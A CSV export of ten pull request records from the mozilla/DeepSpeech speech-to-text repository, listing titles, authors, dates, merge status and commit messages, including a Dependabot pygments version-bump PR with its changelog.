,pullid,pulls_number,pulltitle,pullsbody,pullsuserlogin,pullsuserid,pullauthordate,author_association,merged_status,stats_addns,stats_delns,stats_changed_files,pull_repo_desc,pull_repo_lang,pull_commit_sha,pull_commit_message
0,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3600,3600,Fix documentation for check_characters.py script,Closes #3599,CatalinVoss,332459,2021-04-04T00:46:28Z,COLLABORATOR,False,7,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6279b59875b10d429c5a26666887b010a30c7527,Fix documentation for check_characters.py script
1,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3598,3598,Fix #3586: NumPy versions,,lissyx,1645737,2021-04-02T12:43:24Z,COLLABORATOR,False,131,1,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aed5f187cea0ca343cf3fe4a7278ef98fd0d5561,Fix #3586: NumPy versions
2,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3595,3595,WIP: Split workflows,,lissyx,1645737,2021-03-31T15:30:35Z,COLLABORATOR,False,67,5,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5372cb3105d680dbcd5f1c361f067ba01caa6d41,WIP: Split workflows
3,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3594,3594,Fix #3593: Limit tests to PR,,lissyx,1645737,2021-03-31T11:50:55Z,COLLABORATOR,True,6,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3e1afe07eb4197b77ff1ba4f6f3b2d4df47031cb,Fix #3593: Limit tests to PR
4,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3592,3592,Add option for output file,,stellarpower,5004545,2021-03-30T23:22:25Z,NONE,False,10,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c936797aba30841a4baec283457b36335673c8f7,Add option for output file
5,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3591,3591,Fix #3590: Move training to macOS,,lissyx,1645737,2021-03-30T11:30:47Z,COLLABORATOR,True,39,16,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ecc0451229424d7deacf1a6ed3ce0d9ffcf7fb46,Fix #3590: Move training to macOS
6,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3589,3589,WIP Windows CI direct,,reuben,477142,2021-03-30T10:33:53Z,MEMBER,False,417,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7952e478506387c85959f23f859c65996dd3595,WIP Windows CI direct
7,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3587,3587,Bump pygments from 2.6.1 to 2.7.4 in /taskcluster,"Bumps [pygments](https://github.com/pygments/pygments) from 2.6.1 to 2.7.4.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/pygments/pygments/releases"">pygments's releases</a>.</em></p>
<blockquote>
<h2>2.7.4</h2>
<ul>
<li>
<p>Updated lexers:</p>
<ul>
<li>
<p>Apache configurations: Improve handling of malformed tags (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1656"">#1656</a>)</p>
</li>
<li>
<p>CSS: Add support for variables (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1633"">#1633</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1666"">#1666</a>)</p>
</li>
<li>
<p>Crystal (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1650"">#1650</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1670"">#1670</a>)</p>
</li>
<li>
<p>Coq (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1648"">#1648</a>)</p>
</li>
<li>
<p>Fortran: Add missing keywords (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1635"">#1635</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1665"">#1665</a>)</p>
</li>
<li>
<p>Ini (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1624"">#1624</a>)</p>
</li>
<li>
<p>JavaScript and variants (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1647"">#1647</a> -- missing regex flags, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1651"">#1651</a>)</p>
</li>
<li>
<p>Markdown (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1623"">#1623</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1617"">#1617</a>)</p>
</li>
<li>
<p>Shell</p>
<ul>
<li>Lex trailing whitespace as part of the prompt (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1645"">#1645</a>)</li>
<li>Add missing <code>in</code> keyword (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1652"">#1652</a>)</li>
</ul>
</li>
<li>
<p>SQL - Fix keywords (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1668"">#1668</a>)</p>
</li>
<li>
<p>Typescript: Fix incorrect punctuation handling (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1510"">#1510</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1511"">#1511</a>)</p>
</li>
</ul>
</li>
<li>
<p>Fix infinite loop in SML lexer (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1625"">#1625</a>)</p>
</li>
<li>
<p>Fix backtracking string regexes in JavaScript/TypeScript, Modula2
and many other lexers (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1637"">#1637</a>)</p>
</li>
<li>
<p>Limit recursion with nesting Ruby heredocs (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1638"">#1638</a>)</p>
</li>
<li>
<p>Fix a few inefficient regexes for guessing lexers</p>
</li>
<li>
<p>Fix the raw token lexer handling of Unicode (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1616"">#1616</a>)</p>
</li>
<li>
<p>Revert a private API change in the HTML formatter (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1655"">#1655</a>) --
please note that private APIs remain subject to change!</p>
</li>
<li>
<p>Fix several exponential/cubic-complexity regexes found by
Ben Caller/Doyensec (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1675"">#1675</a>)</p>
</li>
<li>
<p>Fix incorrect MATLAB example (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1582"">#1582</a>)</p>
</li>
</ul>
<p>Thanks to Google's OSS-Fuzz project for finding many of these bugs.</p>
<h2>2.7.3</h2>
<ul>
<li>
<p>Updated lexers:</p>
<ul>
<li>Ada (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1581"">#1581</a>)</li>
<li>HTML (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1615"">#1615</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1614"">#1614</a>)</li>
<li>Java (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1594"">#1594</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1586"">#1586</a>)</li>
<li>JavaScript (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1605"">#1605</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1589"">#1589</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1588"">#1588</a>)</li>
<li>JSON (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1569"">#1569</a> -- this is a complete rewrite)</li>
<li>Lean (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1601"">#1601</a>)</li>
<li>LLVM (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1612"">#1612</a>)</li>
<li>Mason (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1592"">#1592</a>)</li>
<li>MySQL (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1555"">#1555</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1551"">#1551</a>)</li>
<li>Rust (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1608"">#1608</a>)</li>
<li>Turtle (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1590"">#1590</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1553"">#1553</a>)</li>
</ul>
</li>
<li>
<p>Deprecated JsonBareObjectLexer, which is now identical to JsonLexer (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1600"">#1600</a>)</p>
</li>
<li>
<p>The <code>ImgFormatter</code> now calculates the exact character width, which fixes some issues with overlapping text (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1213"">#1213</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1611"">#1611</a>)</p>
</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/pygments/pygments/blob/master/CHANGES"">pygments's changelog</a>.</em></p>
<blockquote>
<h2>Version 2.7.4</h2>
<p>(released January 12, 2021)</p>
<ul>
<li>
<p>Updated lexers:</p>
<ul>
<li>
<p>Apache configurations: Improve handling of malformed tags (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1656"">#1656</a>)</p>
</li>
<li>
<p>CSS: Add support for variables (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1633"">#1633</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1666"">#1666</a>)</p>
</li>
<li>
<p>Crystal (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1650"">#1650</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1670"">#1670</a>)</p>
</li>
<li>
<p>Coq (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1648"">#1648</a>)</p>
</li>
<li>
<p>Fortran: Add missing keywords (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1635"">#1635</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1665"">#1665</a>)</p>
</li>
<li>
<p>Ini (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1624"">#1624</a>)</p>
</li>
<li>
<p>JavaScript and variants (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1647"">#1647</a> -- missing regex flags, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1651"">#1651</a>)</p>
</li>
<li>
<p>Markdown (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1623"">#1623</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1617"">#1617</a>)</p>
</li>
<li>
<p>Shell</p>
<ul>
<li>Lex trailing whitespace as part of the prompt (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1645"">#1645</a>)</li>
<li>Add missing <code>in</code> keyword (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1652"">#1652</a>)</li>
</ul>
</li>
<li>
<p>SQL - Fix keywords (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1668"">#1668</a>)</p>
</li>
<li>
<p>Typescript: Fix incorrect punctuation handling (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1510"">#1510</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1511"">#1511</a>)</p>
</li>
</ul>
</li>
<li>
<p>Fix infinite loop in SML lexer (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1625"">#1625</a>)</p>
</li>
<li>
<p>Fix backtracking string regexes in JavaScript/TypeScript, Modula2
and many other lexers (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1637"">#1637</a>)</p>
</li>
<li>
<p>Limit recursion with nesting Ruby heredocs (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1638"">#1638</a>)</p>
</li>
<li>
<p>Fix a few inefficient regexes for guessing lexers</p>
</li>
<li>
<p>Fix the raw token lexer handling of Unicode (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1616"">#1616</a>)</p>
</li>
<li>
<p>Revert a private API change in the HTML formatter (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1655"">#1655</a>) --
please note that private APIs remain subject to change!</p>
</li>
<li>
<p>Fix several exponential/cubic-complexity regexes found by
Ben Caller/Doyensec (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1675"">#1675</a>)</p>
</li>
<li>
<p>Fix incorrect MATLAB example (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1582"">#1582</a>)</p>
</li>
</ul>
<p>Thanks to Google's OSS-Fuzz project for finding many of these bugs.</p>
<h2>Version 2.7.3</h2>
<p>(released December 6, 2020)</p>
<ul>
<li>
<p>Updated lexers:</p>
<ul>
<li>Ada (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1581"">#1581</a>)</li>
<li>HTML (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1615"">#1615</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1614"">#1614</a>)</li>
<li>Java (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1594"">#1594</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1586"">#1586</a>)</li>
<li>JavaScript (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1605"">#1605</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1589"">#1589</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1588"">#1588</a>)</li>
<li>JSON (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1569"">#1569</a> -- this is a complete rewrite)</li>
<li>Lean (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1601"">#1601</a>)</li>
<li>LLVM (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1612"">#1612</a>)</li>
<li>Mason (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1592"">#1592</a>)</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/pygments/pygments/commit/4d555d0fffc914a2a4ac9874416cdaaf8f8c9e74""><code>4d555d0</code></a> Bump version to 2.7.4.</li>
<li><a href=""https://github.com/pygments/pygments/commit/fc3b05ddf25933e45f670534f79fd1df870e142a""><code>fc3b05d</code></a> Update CHANGES.</li>
<li><a href=""https://github.com/pygments/pygments/commit/ad21935815ff6402d402b036e204f0333a77031b""><code>ad21935</code></a> Revert &quot;Added dracula theme style (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1636"">#1636</a>)&quot;</li>
<li><a href=""https://github.com/pygments/pygments/commit/e411506a23a39f4487ecc36afb616cc4715eb571""><code>e411506</code></a> Prepare for 2.7.4 release.</li>
<li><a href=""https://github.com/pygments/pygments/commit/275e34d8f0d265bd474f269471b41c635fe559ff""><code>275e34d</code></a> doc: remove Perl 6 ref</li>
<li><a href=""https://github.com/pygments/pygments/commit/2e7e8c4a7b318f4032493773732754e418279a14""><code>2e7e8c4</code></a> Fix several exponential/cubic complexity regexes found by Ben Caller/Doyensec</li>
<li><a href=""https://github.com/pygments/pygments/commit/eb39c43b6ef992abadb0d25f0504d0cf2f3ccd86""><code>eb39c43</code></a> xquery: fix pop from empty stack</li>
<li><a href=""https://github.com/pygments/pygments/commit/2738778c0b9c615bfcae68972fc656d351d676ca""><code>2738778</code></a> fix coding style in test_analyzer_lexer</li>
<li><a href=""https://github.com/pygments/pygments/commit/02e0f09d796cca5174181e7ae3971cdc010e39b0""><code>02e0f09</code></a> Added 'ERROR STOP' to fortran.py keywords. (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1665"">#1665</a>)</li>
<li><a href=""https://github.com/pygments/pygments/commit/c83fe4888868f79415b50f050c047dc7fe11fd3b""><code>c83fe48</code></a> support added for css variables (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1633"">#1633</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/pygments/pygments/compare/2.6.1...2.7.4"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=pygments&package-manager=pip&previous-version=2.6.1&new-version=2.7.4)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language

You can disable automated security fix PRs for this repo from the [Security Alerts page](https://github.com/mozilla/DeepSpeech/network/alerts).

</details>",dependabot[bot],49699333,2021-03-29T20:38:41Z,NONE,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1688f1ebb02b9f818cf694eba64743cfc98a20fa,"Bump pygments from 2.6.1 to 2.7.4 in /taskcluster

Bumps [pygments](https://github.com/pygments/pygments) from 2.6.1 to 2.7.4.
- [Release notes](https://github.com/pygments/pygments/releases)
- [Changelog](https://github.com/pygments/pygments/blob/master/CHANGES)
- [Commits](https://github.com/pygments/pygments/compare/2.6.1...2.7.4)

Signed-off-by: dependabot[bot] <support@github.com>"
8,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3585,3585,Fix #3578: Re-instate Python TF/TFLite tests on GitHub Actions / macOS,,lissyx,1645737,2021-03-29T09:49:56Z,COLLABORATOR,True,441,14,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e6f3b8ec50c67c41911f6088bc151a3f0b131d70,Fix #3578: Re-instate Python TF/TFLite tests on GitHub Actions / macOS
9,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3583,3583,Train test model ga test,,lissyx,1645737,2021-03-26T15:01:36Z,COLLABORATOR,False,92,7,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,936380836d271784a894d898d52d9054ebaa2bdb,Dummy train test
